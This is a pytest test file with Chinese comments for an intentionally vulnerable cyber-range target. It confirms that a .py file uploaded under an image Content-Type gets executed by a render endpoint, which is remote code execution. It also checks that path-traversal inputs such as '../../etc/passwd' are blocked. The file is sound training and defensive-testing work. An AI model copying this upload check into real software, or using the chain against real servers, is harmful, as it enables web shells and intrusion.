"""CH2 Foothold（校園海報上傳，#153 Campaign Pack v1）攻擊面的真實驗證。

不是模擬：起真的 `ThreadingHTTPServer`，真的 POST 上傳一支偽裝成 `image/png` 的
`.py` 檔（假的「海報」），再真的打 `/poster/render`，斷言程式碼真的被執行（回應
裡出現只有執行到才會印出的 marker）。這是 Upload bypass（T1190）→ Web Shell
（T1505）兩步的落地：現行檢查只認 Content-Type header（攻擊者自報，不驗副檔名／
內容），render 又只憑副檔名決定要不要當程式碼執行 —— 兩層都信任攻擊者能控制的
欄位。若這條測試紅了，代表攻擊鏈本身壞了，不是「規則寫錯」。

`_drop_privileges_to_posterrender` 的低權限帳號（golden VM 上的 `posterrender`）
本機/CI 沒有，函式據此優雅回 None——這段邏輯因此不必依賴真 VM 也能被測試覆蓋；
真正的權限邊界（sudoers 誤設放行 root）只能在大主機 golden VM 上驗證（T4，見
`deploy/range-target/RUNBOOK-attack-chain.md` CH2 段）。
"""

from __future__ import annotations

import http.client
import importlib.util
import os
import threading
import time
from http.server import ThreadingHTTPServer
from pathlib import Path

import pytest

_APP_PATH = Path(__file__).resolve().parents[2] / "deploy" / "range-target" / "app.py"


def _load_app_module(tmp_path: Path):
    # 先設環境變數再 exec_module：POSTER_DIR／LOG_PATH 是 import 期常數（與既有
    # LOG_PATH／SECRET_PATH 同款），指到 tmp_path 才不會在 CI runner 上寫進
    # /var/lib/purplescope（可能沒有寫入權限，而且測試不該碰真實路徑）。
    os.environ["TARGET_POSTER_DIR"] = str(tmp_path / "posters")
    os.environ["TARGET_LOG_PATH"] = str(tmp_path / "app.log")
    spec = importlib.util.spec_from_file_location("range_target_app_ch2", _APP_PATH)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


@pytest.fixture
def app_module(tmp_path):
    return _load_app_module(tmp_path)


@pytest.fixture
def live_server(app_module):
    server = ThreadingHTTPServer(("127.0.0.1", 0), app_module.Handler)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    time.sleep(0.1)  # 給 serve_forever 一點時間把 listener 開起來
    try:
        yield port
    finally:
        server.shutdown()


class TestPosterUploadBypassClassification:
    """純函式：漏洞判定邏輯要被測試釘住，不能只活在 handler 裡（同 `_looks_like_sqli` 的理由）。"""

    def test_py_template_under_allowed_image_content_type_bypasses(self, app_module):
        assert app_module._poster_upload_bypasses_content_check("image/png", "evil.py") is True

    def test_real_image_under_allowed_content_type_does_not_bypass(self, app_module):
        assert app_module._poster_upload_bypasses_content_check("image/png", "poster.png") is False

    def test_disallowed_content_type_does_not_bypass(self, app_module):
        # 檢查確實存在、確實會擋一部分東西 —— 漏洞是「查得不夠」，不是「完全沒查」。
        assert app_module._poster_upload_bypasses_content_check("text/x-python", "evil.py") is False


class TestPosterNameSafety:
    """路徑穿越是刻意擋掉的另一件事，不是本章要展示的漏洞——兩者不該混在一起。"""

    def test_plain_filename_is_safe(self, app_module):
        assert app_module._is_safe_poster_name("evil.py") is True

    def test_path_traversal_segments_are_rejected(self, app_module):
        assert app_module._is_safe_poster_name("../../etc/passwd") is False
        assert app_module._is_safe_poster_name("a/b.py") is False
        assert app_module._is_safe_poster_name("a\\b.py") is False

    def test_empty_or_dot_names_are_rejected(self, app_module):
        assert app_module._is_safe_poster_name("") is False
        assert app_module._is_safe_poster_name(".") is False
        assert app_module._is_safe_poster_name("..") is False


class TestPrivilegeDropGracefulWithoutSystemUser:
    def test_returns_none_when_posterrender_user_does_not_exist(self, app_module):
        # golden VM 才有 posterrender 系統帳號；本機/CI 沒有，函式必須優雅 no-op，
        # 而不是讓上傳→render 這段邏輯因為缺帳號整段測不到。
        assert app_module._drop_privileges_to_posterrender() is None


class TestPosterUploadRenderExploitChain:
    """真 HTTP round-trip。唯一一組會真的 exec 子行程的測試，證明 T1190→T1505 不是紙上談兵。"""

    def test_upload_accepts_py_payload_disguised_as_image_content_type(self, live_server):
        conn = http.client.HTTPConnection("127.0.0.1", live_server, timeout=5)
        conn.request("POST", "/poster/upload?filename=evil.py", body=b"print('x')",
                      headers={"Content-Type": "image/png"})
        resp = conn.getresponse()
        assert resp.status == 201
        resp.read()

    def test_render_of_uploaded_py_template_actually_executes_it(self, live_server):
        marker = "CH2_RCE_PROOF_9f3c"
        conn = http.client.HTTPConnection("127.0.0.1", live_server, timeout=5)
        conn.request("POST", "/poster/upload?filename=payload.py",
                      body=f"print('{marker}')".encode(),
                      headers={"Content-Type": "image/jpeg"})
        conn.getresponse().read()

        conn = http.client.HTTPConnection("127.0.0.1", live_server, timeout=5)
        conn.request("GET", "/poster/render?name=payload.py")
        resp = conn.getresponse()
        body = resp.read().decode()
        assert resp.status == 200
        assert marker in body, f"expected RCE marker in render output, got {body!r}"

    def test_real_image_extension_is_not_executed(self, live_server):
        conn = http.client.HTTPConnection("127.0.0.1", live_server, timeout=5)
        conn.request("POST", "/poster/upload?filename=real.png", body=b"\x89PNG\r\n...",
                      headers={"Content-Type": "image/png"})
        conn.getresponse().read()

        conn = http.client.HTTPConnection("127.0.0.1", live_server, timeout=5)
        conn.request("GET", "/poster/render?name=real.png")
        resp = conn.getresponse()
        body = resp.read().decode()
        assert resp.status == 200
        assert body.strip() == "rendered real.png"

    def test_upload_rejects_content_type_outside_allowlist(self, live_server):
        conn = http.client.HTTPConnection("127.0.0.1", live_server, timeout=5)
        conn.request("POST", "/poster/upload?filename=evil2.py", body=b"print(1)",
                      headers={"Content-Type": "application/x-python"})
        resp = conn.getresponse()
        assert resp.status == 415
        resp.read()

    def test_render_rejects_path_traversal_in_name(self, live_server):
        conn = http.client.HTTPConnection("127.0.0.1", live_server, timeout=5)
        conn.request("GET", "/poster/render?name=../../../etc/passwd")
        resp = conn.getresponse()
        assert resp.status == 400
        resp.read()

    def test_render_of_missing_poster_is_404(self, live_server):
        conn = http.client.HTTPConnection("127.0.0.1", live_server, timeout=5)
        conn.request("GET", "/poster/render?name=nope.py")
        resp = conn.getresponse()
        assert resp.status == 404
        resp.read()
